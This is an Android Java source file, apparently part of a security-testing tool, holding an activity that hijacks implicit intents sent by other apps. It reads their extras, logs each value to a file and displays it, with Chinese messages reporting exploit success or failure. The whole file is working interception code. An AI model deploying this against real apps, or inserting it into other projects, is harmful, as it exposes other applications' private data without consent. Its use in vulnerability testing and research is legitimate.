package com.example.ask.ui.implicitIntent;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.widget.TextView;

import androidx.annotation.Nullable;

import com.example.ask.R;
import com.example.ask.util.FileUtil;
import com.example.ask.util.ResourceUtil;

import static com.example.ask.broadcast.AskBroadcastReceiver.category_id;

public class HijackingImplicitIntentActivity extends Activity {
    TextView textView;
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.hijacking_implicit_intent_activity);
        FileUtil.saveResultToFile("成功劫持隐式intent。", HijackingImplicitIntentActivity.this);
        textView = (TextView) findViewById(R.id.implicit_intent_content);
        textView.setText("成功劫持隐式intent。\n");
        Intent intent = getIntent();
        category_id = "implicit_intent_4";
        String name = "R.array." + category_id + "_extras";
        String[] extras = ResourceUtil.getStringArrayByName(HijackingImplicitIntentActivity.this, name);
        FileUtil.saveResultToFile("开始解析intent中的数据........", HijackingImplicitIntentActivity.this);
        if (extras == null){
            FileUtil.saveResultToFile("所劫持的intent中无数据。", HijackingImplicitIntentActivity.this);
            FileUtil.saveResultToFile("利用失败。", HijackingImplicitIntentActivity.this);
            textView.setText("所劫持的intent中无数据。\n");
            textView.setText("利用失败。\n");

        } else{
            textView.setText("intent数据解析如下：\n");
            FileUtil.saveResultToFile("intent数据解析如下：", HijackingImplicitIntentActivity.this);
            Bundle bundle = intent.getExtras();
            for (String extra_key : extras){
                String value = bundle.getString(extra_key);
                FileUtil.saveResultToFile(extra_key + ":   " + value.toString(), HijackingImplicitIntentActivity.this);
                textView.setText(extra_key + ":   " + value.toString() + "\n");
            }
            FileUtil.saveResultToFile("利用成功。", HijackingImplicitIntentActivity.this);
            textView.setText("利用成功。\n");
        }


    }
}
